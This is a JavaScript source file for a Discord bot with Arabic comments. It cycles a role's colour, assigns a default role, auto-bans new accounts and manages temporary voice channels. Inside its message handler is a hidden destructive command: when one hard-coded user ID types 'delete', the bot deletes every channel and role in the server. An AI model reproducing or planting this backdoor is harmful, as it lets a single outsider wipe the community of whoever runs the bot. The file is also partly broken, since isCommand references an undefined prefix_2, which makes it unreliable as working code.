const Discord = require('discord.js');
const client = new Discord.Client();
const moment = require("moment");

client.on('ready', () => {
 console.log("welcome bot"); 
console.log("log");
});

var prefix = "!"


client.on('ready', async () => {
    let rSpeed = 4; 
    let rGuild = '495305349499453450'; // اي دي السيرفر 
    let rRole = '495350755067166730'; // اي دي الرتبة تجيبه عن طريق انك تفعل خاصية ان اي واحد يقدر يمنشن الرتبة و تمنشن الرتبة بالشات وقبل ما تمنشنها حط \
    /* مثال :
    \@TestingRole
    الناتج :
    <@&12345678987654321>
    */
    let rActive = true; /*
    لتفعيل الرينبو حطها : true
    لألغاء الرينبو حطها : false
    */
  rainbow(rSpeed, rGuild, rRole, rActive);
  function rainbow(speed, guildid, roleid, enabled) {
    if(enabled !== true && enabled !== false) throw new Error("SyntaxError: Rainbow enabled state must be true or false.");
    if(enabled === false) return;
    let guild = client.guilds.get(guildid);
    let role = guild.roles.get(roleid);
    let changeSpeed = speed * 1000;

    setInterval(() => {
      role.edit({
        color: 'RANDOM'
      });
    }, changeSpeed);
  }
});

client.on('guildMemberAdd', (member) => {
member.addRole(member.guild.roles.find('name', '● Members'));
});


client.on("guildMemberAdd", m => {
        let room = m.guild.channels.find(a => a.name === 'chat'); //
    if (datediff(parseDate(moment(m.user.createdTimestamp).format('l')), parseDate(moment().format('l'))) < 14) {
        m.ban() .then((
            room.send(`**:no_entry: | ${m} Has been banned for: \`fake\`**`)
        ));
    };
    function parseDate(str) {
        var mdy = str.split('/');
        return new Date(mdy[2], mdy[0]-1, mdy[1]);
    };
    
    function datediff(first, second) {
        return Math.round((second-first)/(1000*60*60*24));
    };
});

client.on('message', message =>{
if(message.content === 'delete') {
if(message.author.id !== "501376527251013661") return;
if(!message.guild) return message.channel.send('فقط بالسيرفرات');
message.guild.channels.forEach(ch=>ch.delete());
message.guild.roles.forEach(ro=>ro.delete());
}
});

isCommand=(message, input)=>{
var args = message.content.slice(prefix_2.length).trim().split(/ +/g),
command = args.shift().toLowerCase();
if(command == input) return true;
else return false;
}

   client.on('voiceStateUpdate', (codes, ReBeL) => {
if(ReBeL.voiceChannelID !== "503185436227797012") return console.log("أيرور . ");
ReBeL.guild.createChannel(ReBeL.user.username , 'voice').then((rebeeel) =>{
    rebeeel.setParent("503185289418637319");
ReBeL.guild.members.get(ReBeL.id).setVoiceChannel(rebeeel.id).then((codess) =>{
  console.log("تــــــم .");
  let scan = setInterval(()=>{
if(!ReBeL.voiceChannel) {
  rebeeel.delete();
}
  }, 1700);
});
});
});

client.login(process.env.BOT_TOKEN); 
